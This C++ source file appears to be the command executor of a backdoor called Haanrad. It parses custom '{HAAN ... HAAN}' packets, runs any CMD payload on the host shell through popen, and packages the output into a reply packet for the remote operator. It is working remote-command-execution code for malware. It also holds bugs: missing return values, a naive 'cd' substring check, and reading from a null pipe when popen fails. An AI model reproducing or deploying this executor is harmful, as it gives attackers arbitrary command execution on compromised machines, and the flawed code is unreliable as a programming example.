//
// Created by root on 23/11/16.
//

#include <cstring>
#include <zconf.h>
#include "Executor.h"
#include "../../shared/Logger.h"

Message Executor::formatCommand(std::string haanradPacket) {

    // {HAAN 00000000 data HAAN}

    Message message;
    message.rawCommandMessage = haanradPacket;
    message.interMessageCode = InterClientMessageType::NONE;

    unsigned char cmdType = (unsigned char)haanradPacket.at(5);
    //unsigned int hex = (unsigned int)cmdType;


    if(cmdType == to_string(MessageType::CMD).at(0)){
        message.messageType = MessageType::CMD;
    }else if(cmdType == to_string(MessageType::FILE).at(0)){
        message.messageType = MessageType::FILE;
    }else if(cmdType == to_string(MessageType::FILESYNC).at(0)){
        message.messageType = MessageType::FILESYNC;
    }else{
        Logger::debug("Executor:formatCommand - Can Not Determine Message Type. Can't Format Properly");
        message.interMessageCode = InterClientMessageType::ERROR;
        message.messageType = MessageType::INTERCLIENT;
        return message;
    }

    unsigned long ending = haanradPacket.find("HAAN}");
    if(ending == string::npos){
        Logger::debug("Executor:formatCommand - Could Not Find End Of Command. Can't Format Properly");
        message.interMessageCode = InterClientMessageType::ERROR;
        message.messageType = MessageType::INTERCLIENT;
        return message;
    }

    //we found the ending otherwise
    string parameters = haanradPacket.substr(6, (ending - 6));
    Logger::debug("Executor: Command Parameter Is: >" + parameters + "<");
    message.data = parameters;
    return message;
}

//returns whatever is the appropriate response for the execution as haanrad packet
std::string Executor::execute(Message message) {

    //if it is a CMD, exeute it here
    //if it is a FILE or FILESYNC, call the FileSystemManager - Add it to its Queue, it will update its command next event or timeout ?

    if(message.messageType == MessageType::CMD){
        Logger::debug("Executor:execute - Command To Be Executed Is A CMD Command");
        string output = Executor::executeOnConsole(message);
        unsigned char cmdType = (unsigned char)MessageType::CMDANSWER;
        string haanradPacket = "{HAAN";
        haanradPacket += cmdType;
        haanradPacket += output;
        haanradPacket += "HAAN}";

        return haanradPacket;

    }else if(message.messageType == MessageType::FILE || message.messageType == MessageType::FILESYNC){
        Logger::debug("Executor:execute - Command To Be Execute Is A FILE or FILESYNC Command [NOT IMPLEMENTED]");
    }else if(message.messageType == MessageType::SPCCMD){
        Logger::debug("Executor:execute - Command To Be Executed Is A SPCCMD Command [NOT IMPLEMENTED]");

    }else{
        Logger::debug("Executor:execute - Could Not Determine Command Type For Passed In Message. Could Not Execute");
    }


}

//returns the raw response printed out via stdout and stderr
std::string Executor::executeOnConsole(Message message) {

    Logger::debug("Setting Up Variables To Execute Command");
    string command = message.data;

    //append redirects to the command

    //command = command + "\n";
    string response = ""; // storage for response
    const int BUFFERSIZE = 2048;
    char BUFFER[BUFFERSIZE];
    memset(BUFFER, 0 , sizeof(BUFFER));
    FILE *fp;

    Logger::debug("Command At This Point Is: >" + command + "<");

    size_t position = command.find("cd");
    if(position != string::npos){
        Logger::debug("Substring: " + command.substr(position+3));
        if(chdir(command.substr(position+3).c_str()) <0){
            response += "[ERROR CHANGING DIR]";
        };
        response += "[DIRECTORY CHANGED TO]: ";
        command = "pwd";
    }

    command = command + " 2>&1";
    if((fp = popen(command.c_str(), "r")) == NULL){
        Logger::error("Main:executeCommand - There Was An Error Executing The Command");
        response += "[ERROR EXECUTING COMMAND] ";
    }

    Logger::debug("Command Has Been Executed. Response At This Pont Is: >" + response + "<");

    while(fgets(BUFFER, sizeof(BUFFER), fp) != NULL){

        char tmp[BUFFERSIZE];
        strcpy(tmp, BUFFER);

        string responseLine = string(tmp);

        Logger::debug("ResponseLine Is: " + responseLine);

        response += responseLine;

        Logger::debug("Total Response At This Time Is: >" + response + "<");

        //refresh the buffer;
        memset(BUFFER, 0 , sizeof(BUFFER));
    }

    Logger::debug("Done Looping. Total Response At This Time Is: >" + response + "<");
    Logger::debug("Closing popen");

    if(pclose(fp)){
        Logger::debug("Executor:executeOnConsole - There Was An Error Executing The Command Or Command Exited With Error Status");
        response += " [ERROR EXECUTING COMMAND OR COMMAND EXITED WITH ERROR STATUS]";
    }

    Logger::debug("popen Close Complete. Response At this Time Is: >" + response + "<");

    return response;
}